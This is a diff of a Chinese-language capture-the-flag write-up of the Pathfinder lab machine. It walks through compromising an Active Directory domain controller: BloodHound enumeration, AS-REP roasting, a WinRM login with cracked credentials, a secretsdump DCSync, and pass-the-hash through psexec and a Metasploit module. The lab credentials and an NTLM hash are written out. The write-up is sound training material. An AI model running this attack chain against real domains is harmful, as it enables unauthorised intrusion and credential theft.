@@ -1,6 +1,7 @@
 ## 端口扫描
 
-通过masscan对目标10.10.10.30进行快速的端口扫描
+首先，通过masscan对目标10.10.10.30进行快速的端口扫描
+
 ![](./1.png)
  
 从扫描结果看出，该服务器开启了多个AD相关端口，如88端口的kerberos服务和389端口的LDAP服务，这意味着这是一台域控服务器。另外，5985端口开放意味着该服务器开启了winrm服务。
@@ -19,12 +20,15 @@ bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.
 ![](./2.png)
  
 安装neo4j:
+
 apt install neo4j
 
 安装bloodhound:
+
 apt install bloodhound
 
 开启neo4j:
+
 neo4j start console
 
 访问http://localhost:7474/browser，默认用户名neo4j，密码neo4j，会提示修改密码
@@ -50,6 +54,7 @@ GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
 ## 获取普通用户权限
 
 安装evil-winrm:
+
 gem install evil-winrm
 
 通过winrm服务登陆svc_bes账号:  
@@ -57,6 +62,7 @@ gem install evil-winrm
 evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
 
 获取普通用户的flag
+
 ![](./6.png)
 
 ## 权限提升
@@ -70,18 +76,27 @@ secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
 我们获取到了域管理员的NTLM hash，因此可以使用psexec脚本通过PTH(哈希传递)攻击获取system权限
 
 psexec.py megacorp.local/administrator@10.10.10.30 -hashes NTML hash:NTLM hash
+
 ![](./8.png)
 
 msf也有对应的模块
 use windows/smb/psexec_psh
+
 set SMBPass aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+
 set SMBUser administrator
+
 set SMBDomain MEGACORP.LOCAL
+
 set rhosts 10.10.10.30
+
 set rport 445
+
 exploit
+
 ![](./9.png)
 
 ## 整体思路
+
 ![](./思路.jpg)
  
